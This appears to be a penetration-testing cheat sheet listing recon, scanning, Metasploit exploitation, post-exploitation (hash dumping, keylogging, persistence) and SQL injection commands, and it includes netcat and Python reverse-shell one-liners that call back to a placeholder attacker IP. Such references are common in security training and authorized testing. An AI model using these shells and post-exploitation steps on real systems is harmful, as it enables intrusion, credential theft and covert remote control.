Hacker Reference Cheat Sheet

An essential guide for penetration testing, recon, and exploitation techniques.

1. Reconnaissance

# Scan a network with Nmap
nmap -sS -Pn -A [target_ip]

# Passive DNS lookup
whois [domain_name]

dig [domain_name]

# Enumerate subdomains
sublist3r -d [domain_name]

2. Vulnerability Scanning

# OpenVAS
openvas-start

# Nikto web vulnerability scanner
nikto -h [target_url]

# OWASP ZAP
zap.sh

3. Exploitation

# Metasploit Framework
msfconsole

# Search for exploits
search exploit [keyword]

# Launch an exploit
use [exploit_path]
set payload [payload_name]
set RHOST [target_ip]
set LHOST [local_ip]
exploit

4. Post-Exploitation

# Dump password hashes
hashdump

# Capture keystrokes
keyscan_start

# Establish persistence
use persistence

5. Web Hacking

# SQLMap for SQL Injection
sqlmap -u [target_url] --dbs

# Cross-Site Scripting payloads


# Burp Suite for proxy and interception
burpsuite

6. Useful Payloads

# Netcat reverse shell
nc -e /bin/bash [attacker_ip] [port]

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"]);'

7. Debugging Tips

"The quieter you become, the more you are able to hear." - Ram Dass
  • Analyze logs for unusual activity.
  • Use tools like Wireshark for packet analysis.
  • Test exploits in controlled environments.
